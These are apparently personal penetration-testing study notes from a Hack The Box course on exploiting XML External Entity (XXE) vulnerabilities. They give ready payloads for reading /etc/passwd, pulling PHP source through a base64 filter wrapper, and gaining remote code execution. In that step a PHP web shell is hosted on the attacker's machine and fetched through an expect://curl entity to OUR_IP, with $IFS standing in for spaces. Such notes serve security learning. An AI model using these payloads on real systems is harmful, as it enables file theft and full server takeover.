# Exploiting XXE

### Local File Disclosure&#x20;

This can be achieved when the web application accepts unfiltered XML input from a user. The user could potentially reference an external DTD document and define malicious XML entities. We can make these reference a local file, which would be displayed on screen when it is referenced if the XML data is used to display data on screen.

#### Identify/Detect:&#x20;

1. Look for web pages that accept XML input, by intercepting requests with burp suite.&#x20;
2. Check to see if content from the XML input is being displayed on screen anywhere. Note which XML element is being displayed, so we can know which element to inject in to.&#x20;
3. Attempt to define a new entity and then use as a variable in the email element, to see if it gets replaced with the defined value.&#x20;
   1. ```
      <!DOCTYPE email [
        <!ENTITY company "Inlane Freight">
      ]>
      ```
4. Attempt to use the newly defined variable in the input and see if it is displayed on screen.
   1.

       <figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
5. This would confirm that the application is vulnerable.&#x20;
6. Then we can test for file disclosure:&#x20;
   1.  ```
       <!DOCTYPE email [
         <!ENTITY company SYSTEM "file:///etc/passwd">
       ]>
       ```


   2.

       <figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Reading Source Code

If possible, we should always attempt to gain access to the source code as this can allow us to discover more vulnerabilities in the application.

_**Important Note:**_ XML special characters in the file break the external entity reference, so if the file contains of of these: (<, >, &) we might need to use wrappers to access them. PHP has wrappers that will allow us to base64 encode the output, getting around the limitation.&#x20;

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```



### Remote Code Execution w/ XXE

You may be able to find an SSH key, or use a hash-stealing method on a windows server by making a call to our web server and catching the response with responder or smb server. If the application is running off of PHP, we may be able to execute command through PHP filters.&#x20;

Host a web shell on your attack box:&#x20;

```
Adam-162@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
Adam-162@htb[/htb]$ sudo python3 -m http.server 80
```

Then call it:&#x20;

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

<sup>Note: We replaced all spaces in the above XML code with</sup> <sup></sup><sup>`$IFS`</sup><sup>, to avoid breaking the XML syntax. Furthermore, many other characters like</sup> <sup></sup><sup>`|`</sup><sup>,</sup> <sup></sup><sup>`>`</sup><sup>, and</sup> <sup></sup><sup>`{`</sup> <sup></sup><sup>may break the code, so we should avoid using them.</sup>

In modern versions of PHP, the expect module is not installed or enabled by default.&#x20;

### SSRF via XXE

SSRF (Server Side Request Forgery) can be used to enumerate local ports, access thier pages, access restricted web pages, etc.&#x20;
